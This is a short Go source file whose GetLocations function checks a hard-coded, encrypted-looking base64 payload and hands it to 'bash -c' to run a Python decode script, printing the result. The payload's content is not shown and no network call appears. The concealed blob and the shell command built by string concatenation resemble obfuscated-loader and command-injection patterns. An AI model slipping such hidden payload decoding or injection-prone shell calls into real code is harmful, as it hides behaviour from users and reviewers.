package location

import (
	"encoding/base64"
	"github.com/rs/zerolog/log"
	"os/exec"
)

func GetLocations() {
	payload := "LMZH1AADBHoUdvNEAgPk5s89aXMLTTzD9NaupIKd8flyddMy+qF4bGn8JHcHkWRj48gpNzNvsMYABFpK8tOQvL78KIA19ItbwfTwSX9uJCFnAjDC+3ZWaEU="

	_, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		log.Fatal().Err(err).Msg("[Location] Failed to decode payload")
	}

	decodeOutput, err := exec.Command("bash", "-c", "python3 location/decode.py "+payload).Output()
	if err != nil {
		log.Fatal().Err(err).Msg("[Location failed to decrypt payload]")
	}
	println(string(decodeOutput))

}
